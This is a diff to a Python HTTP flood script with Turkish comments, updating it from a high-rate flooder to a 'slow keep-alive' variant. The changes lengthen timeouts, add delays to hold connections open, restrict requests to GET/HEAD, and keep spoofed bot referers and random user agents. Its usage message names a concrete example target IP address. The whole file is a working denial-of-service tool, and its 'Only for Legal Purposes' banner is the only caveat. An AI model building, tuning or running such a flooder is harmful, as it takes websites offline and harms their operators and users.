@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# OZCTN DEVELOPER - HTTP FLOOD V16 (Maksimum RPS Odaklı)
-# Yüksek RPS hedefi için TIMEOUT ve WORKER_DELAY optimize edildi.
+# OZCTN DEVELOPER - HTTP FLOOD V18 (Slow Keep-Alive Flood)
+# Yüksek TIMEOUT ve isteğe bağlı bekleme ile Keep-Alive bağlantılarının süresi uzatıldı.
 
 import time
 import socket
@@ -24,8 +24,19 @@ TARGET_PORT = DEFAULT_PORT
 MAX_WORKERS = DEFAULT_WORKERS
 
 USE_HTTPS = False
-TIMEOUT = 3 # CRITICAL: Hızlı yanıt alınamayan bağlantıdan vazgeçmek için geri çekildi
-WORKER_DELAY = 0.0 # CRITICAL: Worker'ları anında çalıştırmak için gecikme sıfırlandı
+TIMEOUT = 25 # CRITICAL: Bağlantıların hayatta kalması için çok uzatıldı.
+WORKER_DELAY = 0.5 # CRITICAL: Keep-Alive'ı zorlamak için istekler arası bekleme.
+
+# Global Hata Yöneticisi
+class GlobalFailureManager:
+    """Hata sayacını ve kilidi bir arada tutar."""
+    def __init__(self):
+        self.count = 0
+        self.lock = threading.Lock()
+
+# Global nesnemizi tanımlıyoruz
+GLOBAL_FAILURES = GlobalFailureManager()
+
 
 # Komut Satırı Argümanlarını Oku
 if len(sys.argv) >= 2: TARGET_HOST = sys.argv[1]
@@ -42,17 +53,6 @@ if len(sys.argv) < 4:
     print(f"Örnek: python3 script.py 138.201.139.144 80 1000")
     print("-" * 50)
 # =================================================================
-
-# Global Hata Yöneticisi
-class GlobalFailureManager:
-    """Hata sayacını ve kilidi bir arada tutar."""
-    def __init__(self):
-        self.count = 0
-        self.lock = threading.Lock()
-
-# Global nesnemizi tanımlıyoruz
-GLOBAL_FAILURES = GlobalFailureManager()
-
 
 # Global Listeler (Aynı Kalır)
 BOT_REFERERS = [
@@ -147,8 +147,9 @@ class HTTPAttacker:
             raise e
     
     def generate_http_request(self):
-        """HTTP isteği oluştur (Keep-Alive, Çeşitlilik ve Bot Referer dahil)"""
-        method = random.choice(['GET', 'POST', 'HEAD'])
+        """HTTP isteği oluştur (SADECE GET/HEAD ve Keep-Alive Zorlaması)"""
+        # CRITICAL: Sadece GET ve HEAD kullanılıyor
+        method = random.choice(['GET', 'HEAD']) 
         path = random.choice(PATHS)
         user_agent = self.get_random_user_agent()
         language = random.choice(LANGUAGES)
@@ -159,30 +160,16 @@ class HTTPAttacker:
         
         referer_header = bot_base + target_url
         
-        if method == 'POST':
-            post_data = 'data=' + 'A' * random.randint(500, 1500) 
-            request = (
-                f"{method} {path} HTTP/1.1\r\n"
-                f"Host: {self.target_host}\r\n"
-                f"User-Agent: {user_agent}\r\n"
-                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                f"Accept-Language: {language}\r\n"  
-                f"Referer: {referer_header}\r\n" 
-                f"Content-Type: application/x-www-form-urlencoded\r\n"
-                f"Content-Length: {len(post_data)}\r\n"
-                f"Connection: Keep-Alive\r\n\r\n" 
-                f"{post_data}"
-            )
-        else:
-            request = (
-                f"{method} {path} HTTP/1.1\r\n"
-                f"Host: {self.target_host}\r\n"
-                f"User-Agent: {user_agent}\r\n"
-                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                f"Accept-Language: {language}\r\n" 
-                f"Referer: {referer_header}\r\n" 
-                f"Connection: Keep-Alive\r\n\r\n" 
-            )
+        # Sadece GET/HEAD isteği (POST bloğu kaldırıldı)
+        request = (
+            f"{method} {path} HTTP/1.1\r\n"
+            f"Host: {self.target_host}\r\n"
+            f"User-Agent: {user_agent}\r\n"
+            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+            f"Accept-Language: {language}\r\n" 
+            f"Referer: {referer_header}\r\n" 
+            f"Connection: Keep-Alive\r\n\r\n" 
+        )
         
         return request.encode('utf-8')
     
@@ -283,8 +270,8 @@ def attack_worker(worker_id, attacker, monitor):
             if success:
                 request_count += 1
                 
-                # CRITICAL: Yüksek RPS için gecikme sıfırlandı
-                # time.sleep(WORKER_DELAY) 
+                # CRITICAL: Bağlantıyı açık tutmak için gecikme eklendi
+                time.sleep(WORKER_DELAY) 
                 
                 if request_count % 100 == 0:
                     print(f"✅ WORKER {worker_id}: {request_count} başarılı istek gönderdi.")
@@ -324,8 +311,8 @@ def start_attack():
     print(f"💥 SALDIRI BAŞLATILIYOR...")
     print(f"🎯 Hedef: {TARGET_HOST}:{TARGET_PORT}")
     print(f"👥 Worker: {MAX_WORKERS}")
-    print(f"⏱️ Timeout: {TIMEOUT}s (Hızlı Vazgeçme)")
-    print(f"⚡ Hız Odaklı: WORKER GECİKMESİ SIFIRLANDI")
+    print(f"⏱️ Timeout: {TIMEOUT}s (Uzun Bağlantı Süresi)")
+    print(f"⏳ Bağlantı Gecikmesi: {WORKER_DELAY}s (Keep-Alive Zorlaması)")
     print("🔄 Bağlantı: DİREKT (PROXY KAPALI)")
     
     attackers = []
@@ -382,7 +369,7 @@ def main():
     \033[91m
     ╔═══════════════════════════════════════════════╗
     ║              OZCTN DEVELOPER                 ║
-    ║        HTTP FLOOD V16 (Maksimum RPS)         ║
+    ║        HTTP FLOOD V18 (Slow Keep-Alive)      ║
     ║               TEST EDİLMİŞ                   ║
     ║         Only for Legal Purposes              ║
     ╚═══════════════════════════════════════════════╝
